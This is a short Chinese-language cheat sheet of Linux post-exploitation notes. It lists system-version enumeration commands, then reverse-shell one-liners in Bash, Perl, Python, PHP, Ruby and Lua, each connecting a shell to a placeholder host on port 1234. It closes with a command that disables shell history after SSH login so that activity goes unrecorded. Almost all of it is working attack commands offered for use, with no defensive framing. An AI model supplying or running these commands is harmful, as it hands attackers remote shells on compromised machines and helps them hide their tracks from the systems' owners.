# GUN Linux 提权笔记

### 查看系统版本
``` sh
$ uname -a
$ cat /etc/*-release
$ cat /etc/issue
```

### Shell反弹
* **Bash反弹**
``` sh
$ bash -i >& /dev/tcp/1.2.3.4/1234 0>&1
```
* **Perl反弹**
``` sh
$ perl -e 'use Socket;$i="1.2.3.4";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

* **Python反弹**
``` sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* **PHP反弹**
``` sh
$ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
* **Ruby反弹**
``` sh
$ ruby -rsocket -e'f=TCPSocket.open("1.2.3.4",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

* **Lua反弹**
``` sh
$ lua -e "require('socket');require('os');t=socket.tcp();t:connect('1.2.3.4','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 登录SSH后不记录History
``` sh
$ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
```
